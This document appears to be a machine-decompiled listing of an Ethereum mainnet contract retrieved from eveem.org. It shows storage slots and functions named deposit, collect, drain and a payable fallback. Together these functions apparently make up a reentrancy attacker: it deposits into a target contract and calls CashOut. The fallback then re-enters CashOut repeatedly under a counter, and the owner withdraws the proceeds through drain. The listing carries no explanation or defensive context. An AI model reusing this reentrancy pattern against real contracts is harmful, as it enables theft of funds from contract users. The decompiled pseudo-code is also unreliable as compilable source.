# contract source code retrieved from eveem.org
# retrieved on 2019-12-03

#  addr = 0x018115b4b47dDB4f64323a9B979F289CC3a3050b 
#  network = mainnet 
#  ver = 26 Apr 2019 
#  problems = {} 

# storage definitions
def storage:
    # storage address 0
    unknownef89aff3Address # mask: a s
    # storage address 1
    owner # mask: a s
    # storage address 2
    unknown33dc802c # mask: a s
    # storage address 3
    safe # mask: a s
    # storage address 4
    stor4 # mask: a s
# hash = 0x186f0354
# getter = ['bool', ['storage', 8, 0, 3]]
# const = None
# payable = False
def safe(): # not payable
  return bool(safe)


# hash = 0x33dc802c
# getter = ['storage', 256, 0, 2]
# const = None
# payable = False
def unknown33dc802c(): # not payable
  return unknown33dc802c


# hash = 0x78c6006c
# getter = None
# const = None
# payable = False
def unknown78c6006c(): # not payable
  safe = 1
  require ext_code.size(unknownef89aff3Address)
  call unknownef89aff3Address.CashOut(uint256 amount) with:
       gas gas_remaining - 710 wei
      args unknown33dc802c
  require ext_call.success


# hash = 0x8da5cb5b
# getter = ['storage', 160, 0, 1]
# const = None
# payable = False
def owner(): # not payable
  return owner


# hash = 0xd0e30db0
# getter = None
# const = None
# payable = False
def deposit(): # not payable
  require ext_code.size(unknownef89aff3Address)
  call unknownef89aff3Address.Deposit() with:
     value unknown33dc802c wei
       gas gas_remaining - 9710 wei
  require ext_call.success


# hash = 0xe5225381
# getter = None
# const = None
# payable = False
def collect(): # not payable
  safe = 0
  require ext_code.size(unknownef89aff3Address)
  call unknownef89aff3Address.CashOut(uint256 amount) with:
       gas gas_remaining - 710 wei
      args unknown33dc802c
  require ext_call.success


# hash = 0xef89aff3
# getter = ['storage', 160, 0, 0]
# const = None
# payable = False
def unknownef89aff3(): # not payable
  return unknownef89aff3Address


# hash = 0xf6b19c74
# getter = None
# const = None
# payable = False
def drain(uint256 _ethAmount): # not payable
  if caller == owner:
      call caller with:
         value _ethAmount wei
           gas 2300 * is_zero(value) wei


# hash = _fallback()
# getter = None
# const = None
# payable = True
def _fallback() payable: # default function
  if not safe:
      if stor4 >′ 1:
          stor4--
          require ext_code.size(unknownef89aff3Address)
          call unknownef89aff3Address.CashOut(uint256 amount) with:
               gas gas_remaining - 710 wei
              args unknown33dc802c
          require ext_call.success


